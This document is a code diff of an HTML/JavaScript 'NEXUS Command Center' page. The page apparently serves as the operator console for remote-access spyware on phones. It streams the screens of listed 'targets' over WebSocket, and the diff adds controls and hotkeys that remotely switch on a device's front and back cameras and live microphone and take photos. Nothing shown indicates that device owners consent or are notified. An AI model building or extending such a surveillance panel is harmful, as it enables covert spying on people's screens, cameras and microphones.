@@ -6,152 +6,55 @@
     <title>NEXUS - Command Center</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=JetBrains+Mono:wght@300;400;700&display=swap');
-
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        
-        :root {
-            --neon-blue: #00f0ff;
-            --neon-green: #00ff88;
-            --neon-red: #ff0044;
-            --neon-purple: #7b2fff;
-            --dark-bg: #05050f;
-            --glass-border: rgba(255,255,255,0.08);
-        }
-
-        html, body {
-            width: 100%;
-            height: 100%;
-            margin: 0;
-            padding: 0;
-            overflow: hidden;
-            background: var(--dark-bg);
-            color: #fff;
-            font-family: 'JetBrains Mono', monospace;
-            user-select: none;
-        }
-
-        .app {
-            position: fixed;
-            top: 0; left: 0; right: 0; bottom: 0;
-            display: flex;
-            flex-direction: row;
-            background: #000;
-        }
-
-        /* ─── الشريط الجانبي الأيمن ─── */
-        .sidebar-right {
-            width: 180px;
-            background: rgba(8,8,24,0.95);
-            border-left: 1px solid rgba(255,255,255,0.06);
-            display: flex;
-            flex-direction: column;
-            padding: 12px;
-            z-index: 10;
-            flex-shrink: 0;
-            backdrop-filter: blur(20px);
-        }
-
-        .sidebar-header {
-            text-align: center;
-            padding-bottom: 12px;
-            border-bottom: 1px solid rgba(0,240,255,0.1);
-            margin-bottom: 12px;
-        }
-        .sidebar-header .logo {
-            font-family: 'Orbitron', sans-serif;
-            font-size: 14px;
-            font-weight: 900;
-            background: linear-gradient(90deg, var(--neon-blue), var(--neon-purple));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            letter-spacing: 3px;
-        }
-        .sidebar-header .sub { font-size: 9px; color: #444; margin-top: 2px; letter-spacing: 2px; }
-
-        .device-name-box {
-            padding: 10px 12px;
-            background: rgba(0,240,255,0.04);
-            border: 1px solid rgba(0,240,255,0.1);
-            border-radius: 8px;
-            margin-bottom: 12px;
-            text-align: center;
-        }
-        .device-name-box .label { font-size: 8px; color: #555; letter-spacing: 2px; text-transform: uppercase; }
-        .device-name-box .name { font-family: 'Orbitron', sans-serif; font-size: 13px; color: var(--neon-blue); margin-top: 4px; letter-spacing: 1px; }
-        .device-name-box .status-line { display: flex; align-items: center; justify-content: center; gap: 6px; margin-top: 6px; font-size: 9px; }
-        .device-name-box .status-line .dot { width: 5px; height: 5px; border-radius: 50%; }
-        .device-name-box .status-line .dot.online { background: var(--neon-green); box-shadow: 0 0 8px var(--neon-green); }
-        .device-name-box .status-line .dot.offline { background: var(--neon-red); }
-
-        .device-scroll { flex: 1; overflow-y: auto; margin-bottom: 10px; }
-        .device-scroll::-webkit-scrollbar { width: 2px; }
-        .device-scroll::-webkit-scrollbar-thumb { background: rgba(0,240,255,0.2); border-radius: 10px; }
-        
-        .section-title { font-size: 8px; color: #444; letter-spacing: 2px; text-transform: uppercase; margin-bottom: 6px; }
-        
-        .device-item { display: flex; align-items: center; gap: 8px; padding: 8px 10px; margin-bottom: 3px; background: rgba(255,255,255,0.02); border: 1px solid transparent; border-radius: 6px; cursor: pointer; transition: all 0.2s; font-size: 11px; }
-        .device-item:hover { background: rgba(255,255,255,0.05); }
-        .device-item.active { border-color: var(--neon-green); background: rgba(0,255,136,0.06); }
-        .device-item .dev-icon { font-size: 14px; }
-        .device-item .dev-id { flex: 1; font-weight: 600; color: #ccc; }
-        .device-item .dev-dot { width: 5px; height: 5px; border-radius: 50%; }
-        .device-item .dev-dot.online { background: var(--neon-green); }
-        .device-item .dev-dot.offline { background: var(--neon-red); }
-
-        .controls-section { border-top: 1px solid rgba(255,255,255,0.06); padding-top: 10px; display: flex; flex-direction: column; gap: 6px; }
-        
-        .ctrl-btn { display: flex; align-items: center; gap: 10px; padding: 9px 14px; background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.06); border-radius: 8px; color: #888; cursor: pointer; transition: all 0.2s; font-family: 'JetBrains Mono', monospace; font-size: 11px; font-weight: 600; }
-        .ctrl-btn:hover { background: rgba(255,255,255,0.07); color: #fff; border-color: rgba(255,255,255,0.12); }
-        .ctrl-btn .icon { font-size: 16px; width: 22px; text-align: center; }
-        .ctrl-btn .key { font-size: 8px; color: #444; background: rgba(255,255,255,0.05); padding: 1px 6px; border-radius: 3px; margin-left: auto; }
-        .ctrl-btn.active { border-color: var(--neon-red); color: var(--neon-red); background: rgba(255,0,68,0.08); }
-        .ctrl-btn.primary { border-color: rgba(0,240,255,0.15); color: var(--neon-blue); }
-        .ctrl-btn.primary:hover { background: rgba(0,240,255,0.08); border-color: rgba(0,240,255,0.25); }
-
-        .sidebar-stats { border-top: 1px solid rgba(255,255,255,0.06); padding-top: 8px; margin-top: auto; display: grid; grid-template-columns: 1fr 1fr; gap: 4px; }
-        .sidebar-stats .stat { text-align: center; padding: 5px; background: rgba(255,255,255,0.02); border-radius: 4px; }
-        .sidebar-stats .stat .val { display: block; font-family: 'Orbitron', sans-serif; font-size: 14px; color: var(--neon-blue); }
-        .sidebar-stats .stat .lbl { font-size: 7px; color: #555; text-transform: uppercase; letter-spacing: 1px; }
-
-        /* ─── منطقة الشاشة الحية (تثبيت الحاوية بالكامل لمنع الانضغاط) ─── */
-        .screen-area {
-            flex: 1;
-            height: 100%;
-            position: relative;
-            background: #000;
-            overflow: hidden;
-        }
-
-        /* ─── الإصلاح القاتل للكانفاس: ملء قسري مع الحفاظ على الأبعاد العادية ─── */
-        #screenCanvas {
-            position: absolute !important;
-            top: 0 !important;
-            left: 0 !important;
-            width: 100% !important;
-            height: 100% !important;
-            object-fit: cover !important; /* هذا السطر يلغي الحواف السوداء ويمنع تمطيط الصورة للشكل الشريطي النحيف */
-            image-rendering: -webkit-optimize-contrast;
-            image-rendering: pixelated;
-        }
-
+        :root { --neon-blue: #00f0ff; --neon-green: #00ff88; --neon-red: #ff0044; --neon-purple: #7b2fff; --neon-orange: #ff6600; --dark-bg: #05050f; }
+        html, body { width: 100%; height: 100%; overflow: hidden; background: var(--dark-bg); color: #fff; font-family: 'JetBrains Mono', monospace; user-select: none; }
+        .app { position: fixed; top: 0; left: 0; right: 0; bottom: 0; display: flex; background: #000; }
+        .screen-area { flex: 1; position: relative; background: #000; overflow: hidden; }
+        #screenCanvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: contain; image-rendering: auto; }
         .placeholder { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); text-align: center; color: #222; z-index: 2; pointer-events: none; }
         .placeholder .icon { font-size: 80px; opacity: 0.3; }
-        .placeholder h3 { font-size: 14px; color: #333; font-weight: 400; margin-top: 10px; }
+        .placeholder h3 { font-size: 14px; color: #333; }
         .placeholder h3 .highlight { color: var(--neon-blue); opacity: 0.5; }
+        .overlay-info { position: absolute; top: 0; left: 0; right: 0; padding: 8px 14px; display: flex; gap: 15px; font-size: 10px; color: rgba(255,255,255,0.3); z-index: 3; pointer-events: none; }
+        .overlay-info .v { color: var(--neon-blue); font-weight: 700; }
 
-        .screen-overlay { position: absolute; top: 0; left: 0; right: 0; padding: 8px 14px; display: flex; gap: 15px; font-size: 10px; color: rgba(255,255,255,0.3); z-index: 3; pointer-events: none; font-family: 'JetBrains Mono', monospace; }
-        .screen-overlay .val { color: var(--neon-blue); font-weight: 700; }
+        .sidebar-right { width: 220px; background: rgba(8,8,24,0.95); border-left: 1px solid rgba(255,255,255,0.06); display: flex; flex-direction: column; padding: 12px; z-index: 10; flex-shrink: 0; overflow-y: auto; }
+        .sidebar-right::-webkit-scrollbar { width: 3px; }
+        .sidebar-right::-webkit-scrollbar-thumb { background: rgba(0,240,255,0.2); border-radius: 10px; }
+        .s-header { text-align: center; padding-bottom: 10px; border-bottom: 1px solid rgba(0,240,255,0.1); margin-bottom: 10px; }
+        .s-header .logo { font-family: 'Orbitron', sans-serif; font-size: 14px; font-weight: 900; background: linear-gradient(90deg, var(--neon-blue), var(--neon-purple)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .dev-box { padding: 8px 12px; background: rgba(0,240,255,0.04); border: 1px solid rgba(0,240,255,0.1); border-radius: 8px; margin-bottom: 10px; text-align: center; }
+        .dev-box .lbl { font-size: 8px; color: #555; letter-spacing: 2px; }
+        .dev-box .nm { font-family: 'Orbitron', sans-serif; font-size: 13px; color: var(--neon-blue); margin-top: 4px; }
+        .dev-box .st { display: flex; align-items: center; justify-content: center; gap: 6px; margin-top: 4px; font-size: 9px; }
+        .dev-box .st .dot { width: 5px; height: 5px; border-radius: 50%; }
+        .dev-box .st .dot.on { background: var(--neon-green); box-shadow: 0 0 8px var(--neon-green); }
+        .dev-box .st .dot.off { background: var(--neon-red); }
 
-        .toast { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); padding: 8px 20px; background: rgba(0,240,255,0.08); border: 1px solid rgba(0,240,255,0.2); border-radius: 6px; font-size: 11px; color: var(--neon-blue); display: none; z-index: 9999; font-family: 'JetBrains Mono', monospace; backdrop-filter: blur(20px); animation: fadeInUp 0.3s ease; }
+        .sec-title { font-size: 9px; color: #555; letter-spacing: 2px; text-transform: uppercase; margin: 8px 0 6px 0; padding-top: 8px; border-top: 1px solid rgba(255,255,255,0.05); }
+        .btn { display: flex; align-items: center; gap: 10px; padding: 8px 12px; margin-bottom: 4px; background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.06); border-radius: 8px; color: #888; cursor: pointer; transition: all 0.2s; font-family: 'JetBrains Mono', monospace; font-size: 11px; font-weight: 600; width: 100%; }
+        .btn:hover { background: rgba(255,255,255,0.07); color: #fff; border-color: rgba(255,255,255,0.12); }
+        .btn .ic { font-size: 16px; width: 24px; text-align: center; }
+        .btn .bd { font-size: 7px; color: #444; background: rgba(255,255,255,0.05); padding: 1px 6px; border-radius: 3px; margin-left: auto; }
+        .btn.on { border-color: var(--neon-green); color: var(--neon-green); background: rgba(0,255,136,0.08); }
+        .btn.on.red { border-color: var(--neon-red); color: var(--neon-red); background: rgba(255,0,68,0.08); }
+        .btn.blue { border-color: rgba(0,240,255,0.15); color: var(--neon-blue); }
+        .btn.blue:hover { background: rgba(0,240,255,0.08); }
+        .btn.purple { border-color: rgba(123,47,255,0.2); color: var(--neon-purple); }
+        .btn.purple.on { border-color: var(--neon-purple); background: rgba(123,47,255,0.1); }
+        .btn.orange { border-color: rgba(255,102,0,0.2); color: var(--neon-orange); }
+        .btn.orange.on { border-color: var(--neon-orange); background: rgba(255,102,0,0.1); }
+
+        .stats { border-top: 1px solid rgba(255,255,255,0.06); padding-top: 8px; margin-top: auto; display: grid; grid-template-columns: 1fr 1fr; gap: 4px; }
+        .stats .s { text-align: center; padding: 5px; background: rgba(255,255,255,0.02); border-radius: 4px; }
+        .stats .s .v { display: block; font-family: 'Orbitron', sans-serif; font-size: 14px; color: var(--neon-blue); }
+        .stats .s .l { font-size: 7px; color: #555; text-transform: uppercase; letter-spacing: 1px; }
+
+        .toast { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); padding: 8px 20px; background: rgba(0,240,255,0.08); border: 1px solid rgba(0,240,255,0.2); border-radius: 6px; font-size: 11px; color: var(--neon-blue); display: none; z-index: 9999; animation: fadeInUp 0.3s ease; }
         @keyframes fadeInUp { from { opacity: 0; transform: translateX(-50%) translateY(10px); } to { opacity: 1; transform: translateX(-50%) translateY(0); } }
 
-        @media (max-width: 700px) {
-            .sidebar-right { width: 140px; padding: 8px; }
-            .device-name-box .name { font-size: 11px; }
-            .ctrl-btn { font-size: 10px; padding: 7px 10px; }
-            .ctrl-btn .icon { font-size: 14px; width: 18px; }
-            .sidebar-stats .stat .val { font-size: 12px; }
-        }
+        @media (max-width: 700px) { .sidebar-right { width: 160px; padding: 8px; } .btn { font-size: 10px; padding: 6px 10px; } .btn .ic { font-size: 14px; width: 20px; } }
     </style>
 </head>
 <body>
@@ -159,255 +62,198 @@
         <div class="screen-area" id="screenArea">
             <div class="placeholder" id="placeholder">
                 <div class="icon">📡</div>
-                <h3>AWAITING <span class="highlight">CONNECTION</span></h3>
+                <h3>AWAITING <span class="highlight">SIGNAL</span></h3>
             </div>
             <canvas id="screenCanvas"></canvas>
-            
-            <div class="screen-overlay">
-                <span>FPS: <span class="val" id="fpsOverlay">0</span></span>
-                <span>LAT: <span class="val" id="latOverlay">0ms</span></span>
-                <span>FRM: <span class="val" id="frmOverlay">0</span></span>
+            <div class="overlay-info">
+                <span>FPS: <span class="v" id="fpsO">0</span></span>
+                <span>LAT: <span class="v" id="latO">0ms</span></span>
+                <span>SRC: <span class="v" id="srcO">SCR</span></span>
             </div>
         </div>
 
         <div class="sidebar-right">
-            <div class="sidebar-header">
-                <div class="logo">NEXUS</div>
-                <div class="sub">COMMAND CENTER</div>
+            <div class="s-header"><div class="logo">NEXUS</div></div>
+
+            <div class="dev-box">
+                <div class="lbl">TARGET</div>
+                <div class="nm" id="devName">ALL DEVICES</div>
+                <div class="st"><span class="dot on" id="stDot"></span><span id="stText">CONNECTED</span></div>
             </div>
 
-            <div class="device-name-box">
-                <div class="label">TARGET</div>
-                <div class="name" id="currentDeviceName">ALL DEVICES</div>
-                <div class="status-line">
-                    <span class="dot online" id="statusDot"></span>
-                    <span id="statusText">CONNECTED</span>
-                </div>
-            </div>
+            <div class="sec-title">📺 SCREEN</div>
+            <button class="btn on red" onclick="toggleScreen()" id="scrBtn">
+                <span class="ic">⏹</span> LIVE SCREEN <span class="bd">ON</span>
+            </button>
 
-            <div class="section-title">AVAILABLE TARGETS</div>
-            <div class="device-scroll" id="deviceList">
-                <div class="device-item active" onclick="selectDevice('all')" data-id="all">
-                    <span class="dev-icon">🌐</span>
-                    <span class="dev-id">ALL DEVICES</span>
-                    <span class="dev-dot" style="background:var(--neon-blue)"></span>
-                </div>
-            </div>
+            <div class="sec-title">📷 CAMERAS</div>
+            <button class="btn purple" onclick="sendCmd('CAM_FRONT')" id="camFBtn">
+                <span class="ic">🤳</span> FRONT CAM <span class="bd">OFF</span>
+            </button>
+            <button class="btn purple" onclick="sendCmd('CAM_BACK')" id="camBBtn">
+                <span class="ic">📱</span> BACK CAM <span class="bd">OFF</span>
+            </button>
+            <button class="btn" onclick="sendCmd('CAM_STOP')" id="camStopBtn">
+                <span class="ic">⏹</span> STOP CAM
+            </button>
 
-            <div class="controls-section">
-                <button class="ctrl-btn danger active" onclick="toggleStream()" id="streamBtn">
-                    <span class="icon">⏹</span>
-                    LIVE STREAM
-                    <span class="key">F1</span>
-                </button>
-                <button class="ctrl-btn" onclick="clearScreen()">
-                    <span class="icon">✕</span>
-                    CLEAR
-                    <span class="key">F2</span>
-                </button>
-                <button class="ctrl-btn primary" onclick="toggleFullscreen()">
-                    <span class="icon">⛶</span>
-                    FULLSCREEN
-                    <span class="key">F3</span>
-                </button>
-                <button class="ctrl-btn" onclick="captureStill()">
-                    <span class="icon">📷</span>
-                    CAPTURE
-                    <span class="key">F4</span>
-                </button>
-            </div>
+            <div class="sec-title">🎤 AUDIO</div>
+            <button class="btn blue" onclick="toggleAudio()" id="audBtn">
+                <span class="ic">🎧</span> LIVE MIC <span class="bd">OFF</span>
+            </button>
 
-            <div class="sidebar-stats">
-                <div class="stat">
-                    <span class="val" id="fpsSide">0</span>
-                    <span class="lbl">FPS</span>
-                </div>
-                <div class="stat">
-                    <span class="val" id="latSide">0ms</span>
-                    <span class="lbl">LAT</span>
-                </div>
-                <div class="stat">
-                    <span class="val" id="frameCountSide">0</span>
-                    <span class="lbl">FRAMES</span>
-                </div>
-                <div class="stat">
-                    <span class="val" id="deviceCountSide">0</span>
-                    <span class="lbl">TARGETS</span>
-                </div>
+            <div class="sec-title">📸 CAPTURE</div>
+            <button class="btn orange" onclick="sendCmd('PHOTO')">
+                <span class="ic">📷</span> TAKE PHOTO
+            </button>
+            <button class="btn" onclick="captureStill()">
+                <span class="ic">🖥️</span> SCREENSHOT
+            </button>
+            <button class="btn blue" onclick="toggleFullscreen()">
+                <span class="ic">⛶</span> FULLSCREEN
+            </button>
+
+            <div class="stats">
+                <div class="s"><span class="v" id="fpsS">0</span><span class="l">FPS</span></div>
+                <div class="s"><span class="v" id="latS">0ms</span><span class="l">LAT</span></div>
+                <div class="s"><span class="v" id="frmS">0</span><span class="l">FRAMES</span></div>
+                <div class="s"><span class="v" id="devS">0</span><span class="l">TARGETS</span></div>
             </div>
         </div>
     </div>
-
     <div class="toast" id="toast"></div>
 
     <script>
-        const protocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
-        const WS_URL = `${protocol}//${location.host}`;
-        
-        let ws = null;
-        let selectedDevice = 'all';
-        let streamActive = true;
-        let frameCount = 0;
-        let lastFrameTime = Date.now();
-        let fpsValues = [];
-        let devices = {};
-        let isFullscreen = false;
-        
+        const WS_URL = `${location.protocol === 'https:' ? 'wss:' : 'ws:'}//${location.host}`;
+        let ws = null, screenOn = true, audioOn = false, camOn = false;
+        let frameCount = 0, lastTime = Date.now(), fpsVals = [], currentSrc = 'screen';
         const canvas = document.getElementById('screenCanvas');
         const ctx = canvas.getContext('2d');
-        
+
         connect();
-        
-        document.addEventListener('keydown', (e) => {
-            switch(e.key) {
-                case 'F1': e.preventDefault(); toggleStream(); break;
-                case 'F2': e.preventDefault(); clearScreen(); break;
-                case 'F3': e.preventDefault(); toggleFullscreen(); break;
-                case 'F4': e.preventDefault(); captureStill(); break;
-            }
-        });
-        
+
         function connect() {
             if (ws && ws.readyState === WebSocket.OPEN) return;
-            ws = new WebSocket(`${WS_URL}?type=viewer&viewer=${Math.random().toString(36).substring(7)}`);
-            
-            ws.onopen = () => { updateConnection(true); showToast('🟢 SYSTEM ONLINE'); };
-            ws.onmessage = (event) => { try { handleMessage(JSON.parse(event.data)); } catch(e) {} };
-            ws.onclose = () => { updateConnection(false); setTimeout(connect, 3000); };
+            ws = new WebSocket(`${WS_URL}?type=viewer&v=${Math.random().toString(36).substring(7)}`);
+            ws.onopen = () => { upCon(true); toast('🟢 ONLINE'); };
+            ws.onmessage = e => { try { handle(JSON.parse(e.data)); } catch(_) {} };
+            ws.onclose = () => { upCon(false); setTimeout(connect, 3000); };
         }
 
-        function handleMessage(data) {
-            switch(data.type) {
+        function handle(d) {
+            switch(d.type) {
                 case 'device_list':
-                    devices = {};
-                    data.devices.forEach(d => { devices[d.id] = { id: d.id, online: true }; });
-                    renderDevices();
-                    break;
-                case 'device_online':
-                    devices[data.deviceId] = { id: data.deviceId, online: true };
-                    renderDevices();
-                    break;
-                case 'device_offline':
-                    if (devices[data.deviceId]) devices[data.deviceId].online = false;
-                    renderDevices();
+                    document.getElementById('devS').textContent = d.devices.length;
+                    if (d.devices.length > 0) {
+                        document.getElementById('devName').textContent = d.devices[0].id.substring(0,6).toUpperCase();
+                    }
                     break;
                 case 'frame':
-                    if ((selectedDevice === 'all' || selectedDevice === data.deviceId) && streamActive) {
-                        renderFrame(data.image);
-                        updateStats();
-                    }
+                    if (screenOn && (!camOn || currentSrc === 'screen')) { render(d.image); stats(); }
+                    break;
+                case 'camera_frame':
+                    currentSrc = 'camera';
+                    document.getElementById('srcO').textContent = 'CAM';
+                    render(d.image); stats();
+                    break;
+                case 'photo':
+                    toast('📸 PHOTO RECEIVED');
+                    break;
+                case 'audio_data':
+                    // يمكن إضافة مشغل صوت هنا
+                    break;
+                case 'device_status':
+                    handleStatus(d.status);
                     break;
             }
         }
 
-        function renderFrame(base64Image) {
+        function handleStatus(s) {
+            if (s.includes('CAM:FRONT:ON')) { camOn = true; upBtn('camFBtn', true, '🤳 FRONT'); currentSrc = 'camera'; document.getElementById('srcO').textContent = 'FRONT'; }
+            else if (s.includes('CAM:BACK:ON')) { camOn = true; upBtn('camBBtn', true, '📱 BACK'); currentSrc = 'camera'; document.getElementById('srcO').textContent = 'BACK'; }
+            else if (s.includes('CAM:STOP:OK')) { camOn = false; upBtn('camFBtn', false, '🤳 FRONT'); upBtn('camBBtn', false, '📱 BACK'); currentSrc = 'screen'; document.getElementById('srcO').textContent = 'SCR'; }
+            else if (s.includes('AUDIO:ON')) { audioOn = true; upBtn('audBtn', true, '🎧 LIVE MIC'); }
+            else if (s.includes('AUDIO:OFF')) { audioOn = false; upBtn('audBtn', false, '🎧 LIVE MIC'); }
+            else if (s.includes('PHOTO:OK')) { toast('📸 PHOTO DONE'); }
+            toast('📡 ' + s);
+        }
+
+        function render(b64) {
             const img = new Image();
             img.onload = () => {
-                // ضبط دقة الرسم الداخلي لمطابقة حجم الصورة الأصلية القادمة بدقة مذهلة
-                canvas.width = img.width;
-                canvas.height = img.height;
-                
-                ctx.imageSmoothingEnabled = true;
-                ctx.imageSmoothingQuality = 'high';
-                ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
-                
+                canvas.width = img.width; canvas.height = img.height;
+                ctx.imageSmoothingEnabled = true; ctx.imageSmoothingQuality = 'high';
+                ctx.drawImage(img, 0, 0);
                 document.getElementById('placeholder').style.display = 'none';
                 frameCount++;
-                document.getElementById('frmOverlay').textContent = frameCount;
-                document.getElementById('frameCountSide').textContent = frameCount;
+                document.getElementById('frmS').textContent = frameCount;
             };
-            img.src = 'data:image/jpeg;base64,' + base64Image;
+            img.src = 'data:image/jpeg;base64,' + b64;
         }
 
-        function updateStats() {
-            const now = Date.now();
-            const elapsed = now - lastFrameTime;
-            lastFrameTime = now;
-            const fps = Math.round(1000 / Math.max(elapsed, 1));
-            fpsValues.push(fps);
-            if (fpsValues.length > 20) fpsValues.shift();
-            const avgFps = Math.round(fpsValues.reduce((a,b)=>a+b, 0) / fpsValues.length);
-            document.getElementById('fpsOverlay').textContent = avgFps;
-            document.getElementById('fpsSide').textContent = avgFps;
-            document.getElementById('latOverlay').textContent = elapsed + 'ms';
-            document.getElementById('latSide').textContent = elapsed + 'ms';
+        function stats() {
+            const n = Date.now(), e = n - lastTime; lastTime = n;
+            const f = Math.round(1000 / Math.max(e, 1));
+            fpsVals.push(f); if (fpsVals.length > 20) fpsVals.shift();
+            const a = Math.round(fpsVals.reduce((x,y)=>x+y, 0) / fpsVals.length);
+            document.getElementById('fpsO').textContent = a;
+            document.getElementById('fpsS').textContent = a;
+            document.getElementById('latO').textContent = e + 'ms';
+            document.getElementById('latS').textContent = e + 'ms';
         }
 
-        function renderDevices() {
-            const list = document.getElementById('deviceList');
-            const ids = Object.keys(devices);
-            document.getElementById('deviceCountSide').textContent = ids.length;
-            let html = `<div class="device-item ${selectedDevice === 'all' ? 'active' : ''}" onclick="selectDevice('all')" data-id="all">
-                <span class="dev-icon">🌐</span>
-                <span class="dev-id">ALL DEVICES</span>
-                <span class="dev-dot" style="background:var(--neon-blue)"></span>
-            </div>`;
-            ids.forEach(id => {
-                const d = devices[id];
-                html += `<div class="device-item ${selectedDevice === id ? 'active' : ''}" onclick="selectDevice('${id}')" data-id="${id}">
-                    <span class="dev-icon">📱</span>
-                    <span class="dev-id">${id.substring(0,6).toUpperCase()}</span>
-                    <span class="dev-dot ${d.online ? 'online' : 'offline'}"></span>
-                </div>`;
-            });
-            list.innerHTML = html;
+        function sendCmd(cmd) {
+            if (ws && ws.readyState === WebSocket.OPEN) ws.send(cmd);
+            else toast('⚠ NO CONNECTION');
         }
 
-        function selectDevice(id) {
-            selectedDevice = id;
-            document.querySelectorAll('.device-item').forEach(el => { el.classList.toggle('active', el.dataset.id === id); });
-            const nameBox = document.getElementById('currentDeviceName');
-            nameBox.textContent = id === 'all' ? 'ALL DEVICES' : id.substring(0,6).toUpperCase();
-            clearScreen();
+        function toggleScreen() {
+            screenOn = !screenOn;
+            const b = document.getElementById('scrBtn');
+            b.className = `btn ${screenOn ? 'on red' : 'blue'}`;
+            b.innerHTML = `<span class="ic">${screenOn ? '⏹' : '▶'}</span> LIVE SCREEN <span class="bd">${screenOn ? 'ON' : 'OFF'}</span>`;
         }
 
-        function toggleStream() {
-            streamActive = !streamActive;
-            const btn = document.getElementById('streamBtn');
-            const icon = btn.querySelector('.icon');
-            if (streamActive) { icon.textContent = '⏹'; btn.className = 'ctrl-btn danger active'; } 
-            else { icon.textContent = '▶'; btn.className = 'ctrl-btn primary'; }
-        }
-
-        function clearScreen() {
-            canvas.width = 0; canvas.height = 0;
-            document.getElementById('placeholder').style.display = 'block';
-            frameCount = 0;
+        function toggleAudio() {
+            sendCmd(audioOn ? 'AUDIO_STOP' : 'AUDIO_START');
         }
 
         function toggleFullscreen() {
-            const container = document.getElementById('screenArea');
-            if (!document.fullscreenElement) {
-                if (container.requestFullscreen) container.requestFullscreen();
-                isFullscreen = true;
-            } else {
-                if (document.exitFullscreen) document.exitFullscreen();
-                isFullscreen = false;
-            }
+            const el = document.getElementById('screenArea');
+            if (!document.fullscreenElement) { el.requestFullscreen(); } else { document.exitFullscreen(); }
         }
 
         function captureStill() {
             if (!canvas.width || !canvas.height) return;
-            const link = document.createElement('a');
-            link.download = `nexus_${Date.now()}.jpg`;
-            link.href = canvas.toDataURL('image/jpeg', 0.95);
-            link.click();
+            const a = document.createElement('a');
+            a.download = `nexus_${Date.now()}.jpg`;
+            a.href = canvas.toDataURL('image/jpeg', 0.95);
+            a.click();
+            toast('📸 SCREENSHOT');
         }
 
-        function updateConnection(online) {
-            const dot = document.getElementById('statusDot');
-            const text = document.getElementById('statusText');
-            dot.className = `dot ${online ? 'online' : 'offline'}`;
-            text.textContent = online ? 'CONNECTED' : 'DISCONNECTED';
+        function upBtn(id, on, label) {
+            const b = document.getElementById(id);
+            b.className = `btn ${on ? 'on' : ''}`;
+            b.innerHTML = `<span class="ic">${label.split(' ')[0]}</span> ${label} <span class="bd">${on ? 'ON' : 'OFF'}</span>`;
         }
 
-        function showToast(msg) {
-            const toast = document.getElementById('toast');
-            toast.textContent = msg;
-            toast.style.display = 'block';
-            clearTimeout(toast._timeout);
-            toast._timeout = setTimeout(() => { toast.style.display = 'none'; }, 2500);
+        function upCon(online) {
+            document.getElementById('stDot').className = `dot ${online ? 'on' : 'off'}`;
+            document.getElementById('stText').textContent = online ? 'CONNECTED' : 'DISCONNECTED';
         }
+
+        function toast(m) {
+            const t = document.getElementById('toast');
+            t.textContent = m; t.style.display = 'block';
+            clearTimeout(t._t);
+            t._t = setTimeout(() => { t.style.display = 'none'; }, 2500);
+        }
+
+        // Keyboard shortcuts
+        document.addEventListener('keydown', e => {
+            switch(e.key) { case '1': sendCmd('CAM_FRONT'); break; case '2': sendCmd('CAM_BACK'); break; case '3': sendCmd('CAM_STOP'); break; case '4': toggleAudio(); break; case '5': sendCmd('PHOTO'); break; case '6': captureStill(); break; case '0': toggleScreen(); break; }
+        });
     </script>
 </body>
 </html>
